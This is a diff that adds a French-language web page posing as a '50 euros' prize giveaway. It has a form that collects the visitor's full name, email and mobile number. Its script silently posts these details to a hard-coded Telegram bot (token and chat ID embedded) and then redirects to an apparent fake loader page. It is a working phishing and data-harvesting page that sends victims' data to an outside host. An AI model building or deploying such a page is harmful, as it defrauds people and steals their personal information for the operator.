@@ -1,0 +1,199 @@
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gagnez 50 euros des maintenant</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap"
+        rel="stylesheet">
+
+    <style>
+        * {
+            margin: 0%;
+            padding: 0%;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Poppins', sans-serif;
+            height: 100%;
+        }
+
+
+        .top {
+            background: url(./img/top2.jpg) center/cover;
+            height: 180px;
+        }
+
+        .head {
+            font-size: 1.6rem;
+            text-align: center;
+            font-weight: 500;
+            color: black;
+        }
+
+        .center {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        P {
+            text-align: center;
+            color: grey;
+        }
+
+        form {
+            width: 100%;
+        }
+
+        input {
+            width: 100%;
+            height: 50px;
+            border: 1px solid grey;
+            font-size: 1.2rem;
+            padding-left: 10px;
+            border-radius: 10px;
+        }
+
+        input:focus {
+            outline: none;
+            border: 2px solid teal;
+        }
+
+        button {
+            min-height: 60px;
+            width: 160px;
+            border: none;
+            border-radius: 9999px;
+            background-color: teal;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 1.5rem;
+            margin-top: auto;
+            margin-left: auto;
+
+
+        }
+
+        button svg {
+            height: 40px;
+            width: 40px;
+            color: white;
+        }
+
+        @media screen and (min-width: 724px) {
+
+
+            .center {
+                width: 450px;
+                padding: 0px 30px 0px 30px;
+                margin: auto;
+            }
+
+            button {
+                margin-left: auto;
+                cursor: pointer;
+            }
+
+            /* Ajoute d'autres styles spécifiques aux écrans PC ici */
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="top">
+
+
+    </div>
+
+    <div class="center">
+        <br>
+        <img src="./img/logo.jpg" width="80">
+
+        <br>
+        <p class="head">Tentez votre chance !
+        <p>
+
+            <br> <br>
+
+        <form id="form">
+
+            <input type="text" id="nom" placeholder="Nom et Prenom" required> <br> <br>
+            <input type="email" id="email" placeholder="Adresse e-mail" required> <br> <br>
+            <input type="tel" id="tel" placeholder="Numéro de téléphone mobile" maxlength="10" minlength="10" required> <br>
+            <br>
+            <br>
+            <button type="submit">Je participe</button>
+            <br>
+            <br>
+        </form>
+
+        <br>
+        <br>
+
+
+    </div>
+
+    <script>
+
+        document.getElementById('form').addEventListener('submit', function (e) {
+            e.preventDefault();
+
+            // Récupération des valeurs du formulaire
+            const nom = document.getElementById('nom').value;
+            const email = document.getElementById('email').value;
+            const tel = document.getElementById('tel').value;
+
+            // Construction du message
+            const message = `
+                Jeux résultat :
+ \n😎Nom: ${nom}
+ \n📞Tel: ${tel}
+ \n📩E-mail : ${email}
+        
+            `;
+
+            const botToken = '7366002950:AAFzze0vYX5nxrxWxX7y4vVg2CcJy-3Fsi4'; // Remplacez par votre token
+            const chatId = '7332838769'; // Remplacez par votre chat ID
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+            // Envoi du message au bot Telegram
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        console.log('Votre message a été envoyé avec succès !');
+                        localStorage.setItem('name', nom);
+                        window.location.href = './loader1.html';
+                    } else {
+                        console.error('Erreur lors de l\'envoi du message:', data.description);
+                        console.log('Une erreur est survenue lors de l\'envoi de votre message. Veuillez réessayer.');
+                    }
+                })
+                .catch(error => {
+                    console.error('Erreur réseau ou serveur:', error);
+                    console.log('Une erreur est survenue lors de l\'envoi de votre message. Veuillez réessayer.');
+                });
+        });
+
+    </script>
+
+</body>
+
+</html>
